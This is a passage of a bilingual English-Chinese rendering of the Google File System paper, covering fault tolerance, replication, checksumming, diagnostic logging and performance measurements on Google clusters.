frequent component failures. The quality and quantity of components together make these problems more the norm than the exception: we cannot completely trust the machines, nor can we completely trust the disks. Component failures can result in an unavailable system or, worse, corrupted data. We discuss how we meet these challenges and the tools we have built into the system to diagnose problems when they inevitably occur.</p><p>我们在设计系统时面临的最大挑战之一是处理频繁的组件故障。 组件的质量和数量共同使这些问题成为常态而不是例外：我们不能完全信任机器，也不能完全信任磁盘。 组件故障可能导致系统不可用，或者糟糕到数据损坏。 我们讨论了我们如何应对这些挑战，以及我们在系统中内置的工具，以便在问题不可避免地发生时对其进行诊断。</p><h2 id="5-1、高可用性"><a href="#5-1、高可用性" class="headerlink" title="5.1、高可用性"></a>5.1、高可用性</h2><p>Among hundreds of servers in a GFS cluster, some are bound to be unavailable at any given time. We keep the overall system highly available with two simple yet effective strategies: fast recovery and replication.</p><p>在 GFS 集群中的数百台服务器中，有些服务器可能在任何特定的时间上不可用。我们通过两个简单而有效的策略保持整个系统的高可用性：快速恢复和复制。</p><h3 id="5-1-1、快速恢复"><a href="#5-1-1、快速恢复" class="headerlink" title="5.1.1、快速恢复"></a>5.1.1、快速恢复</h3><p>Both the master and the chunkserver are designed to restore their state and start in seconds no matter how they terminated. In fact, we do not distinguish between normal and abnormal termination; servers are routinely shut down just by killing the process. Clients and other servers experience a minor hiccup as they time out on their outstanding requests, reconnect to the restarted server, and retry. Section 6.2.2 reports observed startup times.</p><p>主服务器和块服务器都被设计为：无论它们发生了什么异常，都能在几秒内启动并恢复它们的状态。实际上，我们不区分正常终止和异常终止； 服务器通常只是通过终止进程来关闭。 客户端和其他服务器在未完成的请求超时、重新连接到重启的服务器并重试时会遇到轻微的问题。 第 6.2.2 节展示了我们观察到的启动时间信息。</p><h3 id="5-1-2、块复制"><a href="#5-1-2、块复制" class="headerlink" title="5.1.2、块复制"></a>5.1.2、块复制</h3><p>As discussed earlier, each chunkis replicated on multiple chunkservers on different racks. Users can specify different replication levels for different parts of the file namespace. The default is three. The master clones existing replicas as needed to keep each chunk fully replicated as chunkservers go offline or detect corrupted replicas through checksum verification (see Section 5.2). Although replication has served us well, we are exploring other forms of cross-server redundancy such as parity or erasure codes for our increasing readonly storage requirements. We expect that it is challenging but manageable to implement these more complicated redundancy schemes in our very loosely coupled system because our traffic is dominated by appends and reads rather than small random writes.</p><p>如前面所说，每个块都被复制到不同机架上的多个块服务器上。 用户可以为文件命名空间的不同部分指定不同的复制级别。 默认值为 3 。 主服务器根据需要克隆现有副本，当块服务器离线或者通过校验和验证检测损坏的副本时保持每个块完全复制（参见第 5.2 节）。 尽管复制对我们很有帮助，但我们正在探索其他形式的跨服务器冗余，例如奇偶校验或纠删码，以满足我们不断增加的只读存储需求。 我们预计在我们非常松散耦合的系统中实施这些更复杂，具有挑战性但易于管理的冗余方案，因为我们的流量主要是追加写和读取，而不是小的随机写入。</p><h3 id="5-1-3、主复制"><a href="#5-1-3、主复制" class="headerlink" title="5.1.3、主复制"></a>5.1.3、主复制</h3><p>The master state is replicated for reliability. Its operation log and checkpoints are replicated on multiple machines. A mutation to the state is considered committed only after its log record has been flushed to disklocally and on all master replicas. For simplicity, one master process remains in charge of all mutations as well as background activities such as garbage collection that change the system internally. When it fails, it can restart almost instantly. If its machine or diskfails, monitoring infrastructure outside GFS starts a new master process elsewhere with the replicated operation log. Clients use only the canonical name of the master (e.g. gfs-test), which is a DNS alias that can be changed if the master is relocated to another machine.</p><p>复制主服务器的状态来确保可靠性。 它的操作日志和检查点被复制到多台机器上。 只有在其日志记录已刷新到磁盘本地和所有主副本上后，才认为对状态的更改已提交。 为简单起见，一个主服务器进程仍然负责所有变更以及后台活动，例如在内部更改系统的垃圾收集。 当它失败时，它几乎可以立即重新启动。 如果它的机器或磁盘出现故障，GFS 外部的监控基础设施会在别处启动一个新的主服务器进程，并使用复制的操作日志。 客户端仅使用主服务器的规范名称（例如 gfs-test），这是一个 DNS 别名，如果主服务器被重新定位到另一台机器则可以改名。</p><p>Moreover, “shadow” masters provide read-only access to the file system even when the primary master is down. They are shadows, not mirrors, in that they may lag the primary slightly, typically fractions of a second. They enhance read availability for files that are not being actively mutated or applications that do not mind getting slightly stale results. In fact, since file content is read from chunkservers, applications do not observe stale file content. What could be stale within short windows is file metadata, like directory contents or access control information.</p><p>此外，主服务的 “影子“ 提供了对文件系统的只读访问，即使在主要的主服务器（primary master）关闭时也是如此。 它们是影子，而不是镜子，因为它们可能会稍微滞后于主服务器，通常是几分之一秒。 它们增强了未被主动改变的文件或不介意获得略微过时结果的应用程序的读取可用性。 事实上，由于文件内容是从块服务器读取的，应用程序也不会看到老的文件内容。 短窗口内可能过时的是文件元数据，如目录内容或访问控制信息。</p><p>To keep itself informed, a shadow master reads a replica of the growing operation log and applies the same sequence of changes to its data structures exactly as the primary does. Like the primary, it polls chunkservers at startup (and infrequently thereafter) to locate chunk replicas and exchanges frequent handshake messages with them to monitor their status. It depends on the primary master only for replica location updates resulting from the primary’s decisions to create and delete replicas.</p><p>为了让自己了解情况，主服务器的影子读取不断增长的操作日志的副本，并将与主服务器完全相同的更改序列应用于其数据结构。 与主服务器一样，它在启动时（之后很少）轮询块服务器以定位块副本并与它们交换频繁的握手消息以监视它们的状态。 它仅依赖来获取由主要的主服务器（primary master）创建和删除副本的决定所导致的副本位置更新。</p><h2 id="5-2、数据的完整性"><a href="#5-2、数据的完整性" class="headerlink" title="5.2、数据的完整性"></a>5.2、数据的完整性</h2><p>Each chunkserver uses checksumming to detect corruption of stored data. Given that a GFS cluster often has thousands of disks on hundreds of machines, it regularly experiences disk failures that cause data corruption or loss on both the read and write paths. (See Section 7 for one cause.) We can recover from corruption using other chunk replicas, but it would be impractical to detect corruption by comparing replicas across chunkservers. Moreover, divergent replicas may be legal: the semantics of GFS mutations, in particular atomic record append as discussed earlier, does not guarantee identical replicas. Therefore, each chunkserver must independently verify the integrity of its own copy by maintaining checksums.</p><p>每个块服务器使用校验和来检测存储数据的损坏。 鉴于 GFS 集群通常在数百台机器上有数千个磁盘，它经常会遇到磁盘故障，导致读取和写入路径上的数据损坏或丢失。 （一个原因参见第 7 节。）我们可以使用其他块副本从损坏中恢复，但是通过跨块服务器比较副本来检测损坏是不切实际的。 此外，不同的副本可能是合法的：GFS 变更（突变）的语义，特别是前面讨论的原子记录追加，不保证副本的相同。 因此，每个块服务器必须通过维护校验和来独立验证自己副本的完整性。</p><p>A chunkis broken up into 64 KB blocks. Each has a corresponding 32 bit checksum. Like other metadata, checksums are kept in memory and stored persistently with logging, separate from user data.</p><p>块被分成 64 KB 的块。 每个都有相应的 32 位校验和。 与其他元数据一样，校验和保存在内存中并与日志记录一起永久存储，与用户数据分开。</p><p>For reads, the chunkserver verifies the checksum of data blocks that overlap the read range before returning any data to the requester, whether a client or another chunkserver. Therefore chunkservers will not propagate corruptions to other machines. If a block does not match the recorded checksum, the chunkserver returns an error to the requestor and reports the mismatch to the master. In response, the requestor will read from other replicas, while the master will clone the chunk from another replica. After a valid new replica is in place, the master instructs the chunkserver that reported the mismatch to delete its replica.</p><p>对于读取操作，块服务器在将任何数据返回给请求者之前验证与读取范围重叠的数据块的校验和，无论是客户端还是另一个块服务器。 因此块服务器不会将损坏传播到其他机器。 如果块与记录的校验和不匹配，块服务器将错误返回给请求者并将不匹配报告给主服务器。 作为响应，请求者将从其他副本读取，而主服务器将从另一个副本克隆块。 在一个有效的新副本就位后，主服务器指示报告不匹配的块服务器删除其副本。</p><p>Checksumming has little effect on read performance for several reasons. Since most of our reads span at least a few blocks, we need to read and checksum only a relatively small amount of extra data for verification. GFS client code further reduces this overhead by trying to align reads at checksum block boundaries. Moreover, checksum lookups and comparison on the chunkserver are done without any I&#x2F;O, and checksum calculation can often be overlapped with I&#x2F;Os.</p><p>由于多种原因，校验和对读取性能几乎没有影响。 由于我们的大部分读取至少跨越几个块，因此我们只需要读取和校验和校验相对少量的额外数据以进行验证。 GFS 客户端代码通过尝试在校验和块边界对齐读取进一步减少了这种开销。 此外，块服务器上的校验和查找和比较是在没有任何 I&#x2F;O 的情况下完成的，并且校验和的计算通常可以与 I&#x2F;O 重叠。</p><p>Checksum computation is heavily optimized for writes that append to the end of a chunk(as opposed to writes that overwrite existing data) because they are dominant in our workloads. We just incrementally update the checksum for the last partial checksum block, and compute new checksums for any brand new checksum blocks filled by the append. Even if the last partial checksum block is already corrupted and we fail to detect it now, the new checksum value will not match the stored data, and the corruption will be detected as usual when the blockis next read.</p><p>校验和的计算对于块末尾的追加写入（与覆盖现有数据的写入相反）进行了高度优化，因为它们在我们的工作负载中占主导地位。 我们只是增量地更新最后一个部分校验和块的校验和，并为追加填充的任何全新校验和块计算新的校验和。 即使最后一个部分校验和块已经损坏并且我们现在无法检测到它，新的校验和值也不会与存储的数据匹配，并且在下次读取块时会像往常一样检测到损坏。</p><p>In contrast, if a write overwrites an existing range of the chunk, we must read and verify the first and last blocks of the range being overwritten, then perform the write, and finally compute and record the new checksums. If we do not verify the first and last blocks before overwriting them partially, the new checksums may hide corruption that exists in the regions not being overwritten.</p><p>相反，如果写入覆盖了块的现有范围，我们必须读取并验证被覆盖范围的第一个和最后一个块，然后执行写入，最后计算并记录新的校验和。 如果我们在部分覆盖之前不验证第一个和最后一个块，新的校验和可能会隐藏未被覆盖区域中存在的损坏。</p><p>During idle periods, chunkservers can scan and verify the contents of inactive chunks. This allows us to detect corruption in chunks that are rarely read. Once the corruption is detected, the master can create a new uncorrupted replica and delete the corrupted replica. This prevents an inactive but corrupted chunk replica from fooling the master into thinking that it has enough valid replicas of a chunk.</p><p>在空闲期间，块服务器可以扫描并验证非活动块的内容。 这使我们能够检测很少读取的块中的损坏。 一旦检测到损坏，主服务器就可以创建一个新的未损坏的副本并删除损坏的副本。 这可以防止不活动但已损坏的块副本欺骗主服务器，使其认为它具有足够的块有效副本。</p><h2 id="5-3、诊断工具"><a href="#5-3、诊断工具" class="headerlink" title="5.3、诊断工具"></a>5.3、诊断工具</h2><p>Extensive and detailed diagnostic logging has helped immeasurably in problem isolation, debugging, and performance analysis, while incurring only a minimal cost. Without logs, it is hard to understand transient, non-repeatable interactions between machines. GFS servers generate diagnostic logs that record many significant events (such as chunkservers going up and down) and all RPC requests and replies. These diagnostic logs can be freely deleted without affecting the correctness of the system. However, we try to keep these logs around as far as space permits.</p><p>广泛而详细的诊断日志记录在问题隔离、调试和性能分析方面提供了不可估量的帮助，同时仅需要极低的成本开销。 没有日志，就很难理解机器之间短暂的、不可重复的交互现象。 GFS 服务器生成诊断日志，记录许多重要事件（例如块服务器的启动和关闭）和所有 RPC 请求和回复。 这些诊断日志可以随意删除而不影响系统的正确性。 但是，我们尽量在空间允许的范围内保留这些日志。</p><p>The RPC logs include the exact requests and responses sent on the wire, except for the file data being read or written. By matching requests with replies and collating RPC records on different machines, we can reconstruct the entire interaction history to diagnose a problem. The logs also serve as traces for load testing and performance analysis.</p><p>RPC 日志包括在线路上发送的确切请求和响应，正在读取或写入的文件数据除外。 通过匹配请求与回复并整理不同机器上的 RPC 记录，我们可以重建整个交互历史来诊断问题。 日志还用作负载测试和性能分析的跟踪。</p><p>The performance impact of logging is minimal (and far outweighed by the benefits) because these logs are written sequentially and asynchronously. The most recent events are also kept in memory and available for continuous online monitoring.</p><p>日志记录对性能的影响很小（并且远远超过其好处），因为这些日志是按顺序和异步写入的。 最近的事件也保存在内存中，可用于连续在线监控。</p><h2 id="6、测量"><a href="#6、测量" class="headerlink" title="6、测量"></a>6、测量</h2><p>In this section we present a few micro-benchmarks to illustrate the bottlenecks inherent in the GFS architecture and implementation, and also some numbers from real clusters in use at Google.</p><p>在本节中，我们提供了一些微基准来说明 GFS 体系结构和实现中的固有的瓶颈，以及来自 Google 使用的真实集群的一些数字。</p><h2 id="6-1、微基准"><a href="#6-1、微基准" class="headerlink" title="6.1、微基准"></a>6.1、微基准</h2><p>We measured performance on a GFS cluster consisting of one master, two master replicas, 16 chunkservers, and 16 clients. Note that this configuration was set up for ease of testing. Typical clusters have hundreds of chunkservers and hundreds of clients.</p><p>我们在一个包含 1 个主服务器、 2 个服务器副本、 16 个块服务器和 16 个客户端的 GFS 集群上进行了性能测试。请注意，此配置是为了方便测试而设置的。典型的集群通常具有数百个块服务器和数百个客户端。</p><p>All the machines are configured with dual 1.4 GHz PIII processors, 2 GB of memory, two 80 GB 5400 rpm disks, and a 100 Mbps full-duplex Ethernet connection to an HP 2524 switch. All 19 GFS server machines are connected to one switch, and all 16 client machines to the other. The two switches are connected with a 1 Gbps link.</p><p>所有机器都配置有 2 个 1.4 GHz 的 PIII 处理器、2 GB 内存、2 个 80 GB 的 5400 转速（Revolutions Per Minute ， 转每分）的磁盘以及 100 Mbps 全双工以太网，并连接到 1 个 HP 2524 交换机。所有 19 台 GFS 服务器机器都连接到一个交换机，而所有 16 台客户机连接到另一个交换机。这两个交换机通过 1 Gbps 的链路连接。</p><h3 id="6-1-1、读取"><a href="#6-1-1、读取" class="headerlink" title="6.1.1、读取"></a>6.1.1、读取</h3><p>N clients read simultaneously from the file system. Each client reads a randomly selected 4 MB region from a 320 GB file set. This is repeated 256 times so that each client ends up reading 1 GB of data. The chunkservers taken together have only 32 GB of memory, so we expect at most a 10% hit rate in the Linux buffer cache. Our results should be close to cold cache results.</p><p>N 个客户端同时从文件系统读取。每个客户端从 320 GB 的文件集中随机选择一个 4 MB 的区域进行读取。这个过程重复 256 次，以便每个客户端最终能读取 1 GB 的数据。所有块服务器仅有 32 GB 的内存，因此我们预计 Linux 缓存中最多只有 10% 的命中率。我们的结果应该接近冷启动缓存的结果。</p><p>Figure 3(a) shows the aggregate read rate for N clients and its theoretical limit. The limit peaks at an aggregate of 125 MB&#x2F;s when the 1 Gbps link between the two switches is saturated, or 12.5 MB&#x2F;s per client when its 100 Mbps network interface gets saturated, whichever applies. The observed read rate is 10 MB&#x2F;s, or 80% of the per-client limit, when just one client is reading. The aggregate read rate reaches 94 MB&#x2F;s, about 75% of the 125 MB&#x2F;s linklimit, for 16 readers, or 6 MB&#x2F;s per client. The efficiency drops from 80% to 75% because as the number of readers increases, so does the probability that multiple readers simultaneously read from the same chunkserver.</p><p>图 3 (a) 显示了 N 个客户端的聚合读取速率及其理论极限。当两个交换机之间的 1 Gbps 链路被打满时，聚合读取速率的极限峰值为 125 MB&#x2F;s ，或者当 100 Mbps 的网络接口被打满时，每个客户端的极限峰值为 12.5 MB&#x2F;s 。当只有一个客户端读取时，观察到的读取速率为 10 MB&#x2F;s ，即每个客户端极限峰值的 80% 。当有 16 个读取者时，聚合读取速率达到 94 MB&#x2F;s ，约为 125 MB&#x2F;s 链路限制的 75% ，即每个客户端的读取速率为 6 MB&#x2F;s 。效率从 80% 下降到 75% ，因为随着读取者数量的增加，多个读取者同时从同一块服务器读取的概率也增加了。</p><h3 id="6-1-2、写入"><a href="#6-1-2、写入" class="headerlink" title="6.1.2、写入"></a>6.1.2、写入</h3><p>N clients write simultaneously to N distinct files. Each client writes 1 GB of data to a new file in a series of 1 MB writes. The aggregate write rate and its theoretical limit are shown in Figure 3(b). The limit plateaus at 67 MB&#x2F;s because we need to write each byte to 3 of the 16 chunk servers, each with a 12.5 MB&#x2F;s input connection.</p><p>N 个客户端同时向 N 个不同的文件写数据。每个客户端以连续写 1 MB 的方式将 1 GB 的数据写入一个新文件。图 3 (b) 显示了聚合写入速率及其理论极限。极限值稳定在 67 MB&#x2F;s 左右，因为我们写每个字节的时候都需要将他们写入到 16 个块服务器中的 3 个中，所以每个服务器都会有 12.5 MB&#x2F;s 的输入流量。</p><p>The write rate for one client is 6.3 MB&#x2F;s, about half of the limit. The main culprit for this is our network stack. It does not interact very well with the pipelining scheme we use for pushing data to chunk replicas. Delays in propagating data from one replica to another reduce the overall write rate.</p><p>一个客户端的写入速率为 6.3 MB&#x2F;s ，约为极限速率的一半。网络堆栈是造成这种情况的主要原因。它不能很好的与我们的将数据推送给块副本的流水线的方案相结合。将数据从一个副本传播到另一个副本的延迟会降低整体写入速率。</p><p>Aggregate write rate reaches 35 MB&#x2F;s for 16 clients (or 2.2 MB&#x2F;s per client), about half the theoretical limit. As in the case of reads, it becomes more likely that multiple clients write concurrently to the same chunkserver as the number of clients increases. Moreover, collision is more likely for 16 writers than for 16 readers because each write involves three different replicas.</p><p>当有 16 个客户端时，聚合写入速率会达到 35 MB&#x2F;s （每个客户端 2.2 MB&#x2F;s ），约为理论极限的一半。与读取情况一样，随着客户端数量的增加，多个客户端同时向同一块服务器写入的概率越来越大。由于每个写入操作会涉及到三个不同的副本，所以，与 16 个读取者相比，16 个写入者发生冲突的概率会更大。</p><p>Writes are slower than we would like. In practice this has not been a major problem because even though it increases the latencies as seen by individual clients, it does not significantly affect the aggregate write bandwidth delivered by the system to a large number of clients.</p><p>写入速度比我们期望的要慢。实际上，这并不是一个主要问题，因为尽管它使得单个客户端感知到了延迟的增加，但它并不显著影响系统向大量客户端提供的聚合写入带宽。</p><h3 id="6-1-3、记录追加"><a href="#6-1-3、记录追加" class="headerlink" title="6.1.3、记录追加"></a>6.1.3、记录追加</h3><p>Figure 3(c) shows record append performance. N clients append simultaneously to a single file. Performance is limited by the network bandwidth of the chunkservers that store the last chunk of the file, independent of the number of clients. It starts at 6.0 MB&#x2F;s for one client and drops to 4.8 MB&#x2F;s for 16 clients, mostly due to congestion and variances in network transfer rates seen by different clients.</p><p>图 3 (c) 显示了记录追加性能。 N 个客户端同时追加写数据到一个单独的文件中。性能受限于存储文件的最后一个块的块服务器的网络带宽，与客户端数量无关。对于一个客户端，性能从 6.0 MB&#x2F;s 开始，对于 16 个客户端则降至 4.8 MB&#x2F;s ，主要是由于拥塞和不同客户端感知的网络传输速率的差异。</p><p>Our applications tend to produce multiple such files concurrently. In other words, N clients append to M shared files simultaneously where both N and M are in the dozens or hundreds. Therefore, the chunkserver network congestion in our experiment is not a significant issue in practice because a client can make progress on writing one file while the chunkservers for another file are busy.</p><p>我们的应用程序往往会同时产生多个这样的文件。换句话说， N 个客户端同时追加写数据到 M 个共享文件中，其中 N 和 M 都是几十或几百个。因此，在实践中，我们实验中的块服务器网络拥塞并不是一个重大问题，因为客户端可以在为另一个文件的块服务器忙碌时继续写入一个文件。</p><h2 id="6-2、真实世界集群"><a href="#6-2、真实世界集群" class="headerlink" title="6.2、真实世界集群"></a>6.2、真实世界集群</h2><p>We now examine two clusters in use within Google that are representative of several others like them. Cluster A is used regularly for research and development by over a hundred engineers. A typical taskis initiated by a human user and runs up to several hours. It reads through a few MBs to a few TBs of data, transforms or analyzes the data, and writes the results back to the cluster. Cluster B is primarily used for production data processing. The tasks last much longer and continuously generate and process multi-TB data sets with only occasional human intervention. In both cases, a single “task” consists of many processes on many machines reading and writing many files simultaneously.</p><p>我们现在来看两个 Google 内部具有代表性集群的实际使用案例。集群 A 通常由 100 多名工程师用于研究和开发。一个典型的任务会由一个用户发起，并持续几个小时。它会读取数 MB 到数 TB 的数据，并对数据进行转换或分析，然后将结果写回集群。集群 B 主要用于生产数据处理。任务持续时间更长，会连续生成和处理数 TB 的数据集，并只在偶尔的时候才需要人来干预。在这两种情况下，单个 “任务” 都需要包括多个进程，并在许多机器上同时读写许多文件。</p><div><p><img src="/assets/images/gfs-characteristics-of-two-gfs-clusters.png" alt="表 2：两个 GFS 集群的特征" loading="lazy"></p></div><h3 id="6-2-1、存储"><a href="#6-2-1、存储" class="headerlink" title="6.2.1、存储"></a>6.2.1、存储</h3><p>As shown by the first five entries in the table, both clusters have hundreds of chunkservers, support many TBs of disk space, and are fairly but not completely full. “Used space” includes all chunk replicas. Virtually all files are replicated three times. Therefore, the clusters store 18 TB and 52 TB of file data respectively.</p><p>正如表格中的前五个条目所展示的，这两个集群都拥有数百个块服务器，并支撑着数 TB 的磁盘空间，这些磁盘空间的使用率都挺高。 “已使用空间” 包括所有块的副本。几乎所有文件都有三个副本。因此，这两个集群分别存储了 18TB 和 52TB 的文件数据。</p><p>The two clusters have similar numbers of files, though B has a larger proportion of dead files, namely files which were deleted or replaced by a new version but whose storage have not yet been reclaimed. It also has more chunks because its files tend to be larger.</p><p>这两个集群拥有类似数量的文件，但 B 集群有更高比例的 “死文件”（无用文件），即那些已经被删除或者被新版本替换但其存储空间还没有被回收的文件。 B 集群还有更多的块，因为它的文件往往较大。</p><h3 id="6-2-2、元数据"><a href="#6-2-2、元数据" class="headerlink" title="6.2.2、元数据"></a>6.2.2、元数据</h3><p>The chunkservers in aggregate store tens of GBs of metadata, mostly the checksums for 64 KB blocks of user data. The only other metadata kept at the chunkservers is the chunk version number discussed in Section 4.5.</p><p>总体而言，这些块服务器存储了数十 GB 的元数据，主要是用户数据的 64 KB 块的校验和。在块服务器中保留的唯一其他元数据是第 4.5 节中讨论的块版本号。</p><p>The metadata kept at the master is much smaller, only tens of MBs, or about 100 bytes per file on average. This agrees with our assumption that the size of the master’s memory does not limit the system’s capacity in practice. Most of the per-file metadata is the file names stored in a prefix-compressed form. Other metadata includes file ownership and permissions, mapping from files to chunks, and each chunk’s current version. In addition, for each chunk we store the current replica locations and a reference count for implementing copy-on-write.</p><p>在主服务器中保存的元数据要小得多，只有数十 MB ，平均每个文件约占用 100 个字节。这与我们的假设相符，即主服务器中内存的大小实际上并不会限制整个系统的容量。单个文件的大部分元数据就是文件名，这里使用了前缀压缩的方式来存储它们。其他元数据有：文件所有权和权限，文件到块的映射以及每个块的当前版本。此外，对于每个块，我们还存储当前副本位置和引用计数，以便于实现写时复制（COW）。</p><p>Each individual server, both chunkservers and the master, has only 50 to 100 MB of metadata. Therefore recovery is fast: it takes only a few seconds to read this metadata from disk before the server is able to answer queries. However, the master is somewhat hobbled for a period – typically 30 to 60 seconds – until it has fetched chunk location information from all chunkservers.</p><p>每个单独的服务器，包括块服务器和主服务器，只有 50MB 到 100MB 的元数据。因此，恢复速度很快：在服务器能够相应查询之前，仅需几秒钟的时间就可以从磁盘上读取元数据。但是，主服务器在一段时间内会受到一些限制，这通常是30到60秒，这是因为主服务器需要从所有的块服务器中获取块的位置信息。</p><h3 id="6-2-3、读写速率"><a href="#6-2-3、读写速率" class="headerlink" title="6.2.3、读写速率"></a>6.2.3、读写速率</h3><p>Table 3 shows read and write rates for various time periods. Both clusters had been up for about one week when these measurements were taken. (The clusters had been restarted recently to upgrade to a new version of GFS.)</p><p>表 3 显示了各个时间段的读写速率。在进行这些测量时，这两个集群已经运行了大约一周。（这两个集群最近已重新启动，以升级到 GFS 的新版本。）</p><p>The average write rate was less than 30 MB&#x2F;s since the restart. When we took these measurements, B was in the middle of a burst of write activity generating about 100 MB&#x2F;s of data, which produced a 300 MB&#x2F;s network load because writes are propagated to three replicas.</p><p>自重新启动以来，平均写入速率不到 30MB&#x2F;s 。在进行这些测量时， B 正在进行一次写入活动，每秒生成大约 100MB 的数据，由于写入会传播到三个副本，所以这会产生 300MB&#x2F;s 的网络负载。</p><div><p><img src="/assets/images/gfs-aggregate-throughputs.png" alt="图 3：聚合吞吐量" loading="lazy"></p></div><p>Top curves show theoretical limits imposed by our network topology. Bottom curves show measured throughputs. They have error bars that show 95% confidence intervals, which are illegible in some cases because of low variance in measurements.</p><p>顶部曲线显示了我们的网络拓扑施加的理论限制。 底部曲线显示测量的吞吐量。 他们有显示 95% 置信区间的误差，在某些情况下由于测量方差小而难以辨认。</p><div><p><img src="/assets/images/gfs-performance-metrics-for-two-gfs-clusters.png" alt="表 3：两个 GFS 集群的性能指标" loading="lazy"></p></div><p>The read rates were much higher than the write rates. The total workload consists of more reads than writes as we have assumed. Both clusters were in the middle of heavy read activity. In particular, A had been sustaining a read rate of 580 MB&#x2F;s for the preceding week. Its network configuration can support 750 MB&#x2F;s, so it was using its resources efficiently. Cluster B can support peakread rates of 1300 MB&#x2F;s, but its applications were using just 380 MB&#x2F;s.</p><p>读取速率比写入速率高得多。我们假设总的工作负载中含有较多的读取操作和较少的写入操作。这两个集群都处于大量读取操作的中间阶段。特别地， A 在前一周一直保持着 580MB&#x2F;s 的读取速率。它的网络配置可以支持 750MB&#x2F;s ，因此它有效地利用了自己的资源。集群 B 可以支持最大读取速率为 1300MB&#x2F;s ，但它的应用程序只使用了 380MB&#x2F;s 。</p><h3 id="6-2-4、Master-负载"><a href="#6-2-4、Master-负载" class="headerlink" title="6.2.4、Master 负载"></a>6.2.4、Master 负载</h3><p>Table 3 also shows that the rate of operations sent to the master was around 200 to 500 operations per second. The master can easily keep up with this rate, and therefore is not a bottleneckfor these workloads.</p><p>表 3 还显示，发送到主服务器的操作速率约为每秒 200 到 500 个。主服务器可以轻松应对这个速率，因此对于这些工作负载来说主服务器并没有瓶颈。</p><p>In an earlier version of GFS, the master was occasionally a bottleneckfor some workloads. It spent most of its time sequentially scanning through large directories (which contained hundreds of thousands of files) looking for particular files. We have since changed the master data structures to allow efficient binary searches through the namespace. It can now easily support many thousands of file accesses per second. If necessary, we could speed it up further by placing name lookup caches in front of the namespace data structures.</p><p>在 GFS 的早期版本中，主服务器偶尔会成为某些工作负载的瓶颈。为了寻找特定的文件，它的大部分时间都在顺序扫描包含数十万个文件的大目录。我们后来改变了主服务器的数据结构，使其能够通过命名空间进行高效的二分查找。现在它可以轻松应对每秒数千次的文件访问。如果需要，我们可以通过在命名空间数据结构前面放置名称查找缓存来进一步加快速度。</p><h3 id="6-2-5、恢复时间"><a href="#6-2-5、恢复时间" class="headerlink" title="6.2.5、恢复时间"></a>6.2.5、恢复时间</h3><p>After a chunkserver fails, some chunks will become underreplicated and must be cloned to restore their replication levels. The time it takes to restore all such chunks depends on the amount of resources. In one experiment, we killed a single chunkserver in cluster B. The chunkserver had about 15,000 chunks containing 600 GB of data. To limit the impact on running applications and provide leeway for scheduling decisions, our default parameters limit this cluster to 91 concurrent clonings (40% of the number of chunkservers) where each clone operation is allowed to consume at most 6.25 MB&#x2F;s (50 Mbps). All chunks were restored in 23.2 minutes, at an effective replication rate of 440 MB&#x2F;s.</p><p>当一个块服务器异常后，一些块就会缺少一些备份数量，因此必须进行克隆以恢复它们的备份数量。恢复所有这样的块所需的时间取决于可用资源。在一个实验中，我们在 B 集群中杀死了一个块服务器。这个块服务器大约有 15,000 个块，其中包含了 600 GB 的数据。为了给调度决策提供一些资源，并尽量减少对正在运行的应用程序的影响，我们采用默认的参数并将这个集群限制为 91 个并发克隆（ 40％ 的块服务器数量），每个克隆操作允许消耗最多 6.25 MB&#x2F;s（ 50 Mbps ）。所有的块在 23.2 分钟内恢复，有效的复制速率为 440 MB&#x2F;s 。</p><p>In another experiment, we killed two chunkservers each with roughly 16,000 chunks and 660 GB of data. This double failure reduced 266 chunks to having a single replica. These 266 chunks were cloned at a higher priority, and were all restored to at least 2x replication within 2 minutes, thus putting the cluster in a state where it could tolerate another chunkserver failure without data loss.</p><p>在另一个实验中，我们关闭了两个块服务器，每个块服务器中大约有 16,000 个块和 660GB 的数据。这次两个块服务器的故障导致了 266 个块只有一个副本。这 266 个块将会以更高的优先级被克隆，所有这些块在 2 分钟内都被恢复到至少 2 个副本，从而使集群处于可以容忍即使另一个块服务器故障但也不会丢失数据的状态。</p><h2 id="6-3、-工作负载分解"><a href="#6-3、-工作负载分解" class="headerlink" title="6.3、 工作负载分解"></a>6.3、 工作负载分解</h2><p>In this section, we present a detailed breakdown of the workloads on two GFS clusters comparable but not identical to those in Section 6.2. Cluster X is for research and development while cluster Y is for production data processing.</p><p>在本节中，我们将详细介绍两个与 6.2 节中的类似但不完全相同的 GFS 集群的工作负载。  X 集群用于研究和开发，而 Y 集群用于生产数据处理。</p><h3 id="6-3-1、方法论和注意事项"><a href="#6-3-1、方法论和注意事项" class="headerlink" title="6.3.1、方法论和注意事项"></a>6.3.1、方法论和注意事项</h3><p>These results include only client originated requests so that they reflect the workload generated by our applications for the file system as a whole. They do not include interserver requests to carry out client requests or internal background activities, such as forwarded writes or rebalancing.</p><p>这些结果仅包括客户端发起的请求，因此反映了我们应用程序对整个文件系统造成的工作负载。它们不包括用于执行客户端请求或内部后台活动（例如转发写入或重新平衡）的服务器间请求。</p><p>Statistics on I&#x2F;O operations are based on information heuristically reconstructed from actual RPC requests logged by GFS servers. For example, GFS client code may breaka read into multiple RPCs to increase parallelism, from which we infer the original read. Since our access patterns are highly stylized, we expect any error to be in the noise. Explicit logging by applications might have provided slightly more accurate data, but it is logistically impossible to recompile and restart thousands of running clients to do so and cumbersome to collect the results from as many machines.</p><p>I&#x2F;O 操作的统计数据是基于从 GFS 服务器记录的实际 RPC 请求中启发式重建（heuristically reconstructed）的信息。例如， GFS 客户端代码可能会将读取操作分解为多个 RPC 以增加并行性，从中我们推断出原始读取操作。鉴于我们的访问模式高度规范化，我们预计任何错误都在可接受范围内。虽然应用程序的显式日志记录可能会提供略微更准确的数据，但重新编译和重启数千个正在运行的客户端来执行这种日志记录在逻辑上是不可能的，并且从这么多机器上收集结果也是很麻烦的。</p><p>One should be careful not to overly generalize from our workload. Since Google completely controls both GFS and its applications, the applications tend to be tuned for GFS, and conversely GFS is designed for these applications. Such mutual influence may also exist between general applications and file systems, but the effect is likely more pronounced in our case.</p><p>人们应该注意不要过度泛化我们的工作量。由于 Google 能够完全控制 GFS 和其应用程序，这些应用程序往往会针对于 GFS 进行调优，反之亦然， GFS 也是为这些应用程序而设计的。类似的相互影响也可能存在于通用应用程序和文件系统之间，但在我们的情况下，影响可能更加明显。</p><h3 id="6-3-2、块服务器工作负载"><a href="#6-3-2、块服务器工作负载" class="headerlink" title="6.3.2、块服务器工作负载"></a>6.3.2、块服务器工作负载</h3><div><p><img src="/assets/images/gfs-operations-breakdown-by-size.png" alt="表格4：按大小分类的操作" loading="lazy"></p></div><p>For reads, the size is the amount of data actually read and transferred, rather than the amount requested.</p><p>对于读取，大小是实际读取和传输的数据量，而不是请求的数据量。</p><p>Table 4 shows the distribution of 